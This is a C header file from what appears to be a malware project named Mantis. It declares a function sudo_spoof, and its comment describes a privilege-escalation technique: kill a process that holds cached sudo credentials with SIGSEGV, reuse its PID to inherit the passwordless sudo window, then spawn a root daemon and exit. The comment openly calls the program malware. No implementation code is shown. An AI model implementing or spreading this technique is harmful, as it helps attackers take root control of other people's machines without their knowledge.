// techniques.h
// The fun stuff

#ifndef __TECHNIQUES_H
#define __TECHNIQUES_H

// This technique could really only be called "Sudo spoofing." In this
// technique, we will kill a process imbued with "Sudo Grace" (namely,
// a process that has used Sudo in the last ~15 minutes and can use
// Sudo again to run an admin command but doesn't need a password) and
// replace it with our own process (a process with the same PID),
// giving our new process the "Sudo Grace." Once this process exists,
// we can simply spawn a daemon version of itself as root (which has
// some nuance, but not much) and exit. We can exit because this
// malware is now running as root, and our current process is no
// longer required.
// Additional details:
// When we kill the "graced process," we should send it SIGSEGV
// because this points to the process itself, as opposed to another
// process, which would be the case if we send something like SIGKILL.
// As for the function itself, it won't return on success; it'll kill
// itself on success. Also note, this function will just run... in
// saecula saeculorum. 
// `program`: the program (Mantis) to execute as root.
void sudo_spoof(const char *program);

#endif /* __TECHNIQUES_H */

